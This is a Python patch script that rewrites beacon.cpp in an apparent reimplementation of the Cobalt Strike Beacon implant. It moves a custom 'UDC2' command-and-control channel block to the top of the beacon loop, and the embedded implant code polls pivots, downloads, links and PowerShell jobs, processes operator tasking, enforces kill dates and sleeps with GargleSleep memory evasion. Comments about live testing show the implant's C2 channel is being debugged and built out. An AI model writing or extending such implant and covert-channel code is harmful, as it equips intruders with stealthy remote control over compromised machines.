#!/usr/bin/env python3
"""Move the UDC2 engage block from cycle END to cycle TOP."""
import io

p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon.cpp"
s = io.open(p, encoding="utf-8").read()

# 1) remove the cycle-end engage block
old_end = """		http_close();

		/* 4.12 UDC2: engage at cycle END - the runtime is fully
		 * initialized (winhttp loaded, buffers allocated) before the
		 * BOF loader runs */
		beacon_cycles++;
		if (beacon_cycles >= 1 && udc2_init()) {
			post_type = POST_UDC2;
			post_error_d(0x62, beacon_cycles); /* probe: engage round (rides UDC2 egress) */
			pivot_poll(command_shell_callback);
			download_poll(command_shell_callback, MAX_PACKET);
			link_poll(command_shell_callback);
			psh_poll(command_shell_callback, MAX_PACKET);
			if (check_kill_date())
				command_die(command_shell_callback);
			length = udc2_cycle(buffer, MAX_GET);
			udc2_step_mark(62400 + (length < 0 ? 99 : (length & 0x7F)));
			if (length > 0)
				process_payload(buffer, length);
			if (check_kill_date())
				safe_exit();
			if (sleep_time > 0)
				GargleSleep(sleep_time);
			continue;
		}

		/* 再次检查终止日期 */"""
assert s.count(old_end) == 1, "end block not found"
s = s.replace(old_end, """		http_close();

		/* 再次检查终止日期 */""")

# 2) insert the engage block at cycle TOP (after host selection, before HTTP)
old_top = """		/* 使用HTTP通信输出 */
		if (udc2_booted())
			post_error_d(0x65, beacon_cycles); /* probe: HTTP cycle AFTER udc2 booted */
		post_type = POST_HTTP;"""
assert s.count(old_top) == 1, "top anchor not found"
new_top = """		/* 4.12 UDC2: once the channel BOF is loaded (data-store handoff
		 * during the first HTTP cycles) the WHOLE cycle runs through it.
		 * Cycle 1 always passes through HTTP first - INITIAL plus the
		 * runtime init (winhttp, buffers) the BOF loader relies on. This
		 * must sit at cycle TOP: with it at cycle END every loop ran a
		 * full HTTP GET that drained the task queue before the UDC2
		 * session could deliver it (live: pwd stolen by our own GET). */
		beacon_cycles++;
		if (beacon_cycles >= 1 && udc2_init()) {
			post_type = POST_UDC2;
			post_error_d(0x62, beacon_cycles); /* probe: engage round (rides UDC2 egress) */
			pivot_poll(command_shell_callback);
			download_poll(command_shell_callback, MAX_PACKET);
			link_poll(command_shell_callback);
			psh_poll(command_shell_callback, MAX_PACKET);
			if (check_kill_date())
				command_die(command_shell_callback);
			length = udc2_cycle(buffer, MAX_GET);
			udc2_step_mark(62400 + (length < 0 ? 99 : (length & 0x7F)));
			if (length > 0)
				process_payload(buffer, length);
			if (check_kill_date())
				safe_exit();
			if (sleep_time > 0)
				GargleSleep(sleep_time);
			continue;
		}

		/* 使用HTTP通信输出 */
		post_type = POST_HTTP;"""
s = s.replace(old_top, new_top)
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("engage moved to cycle top")
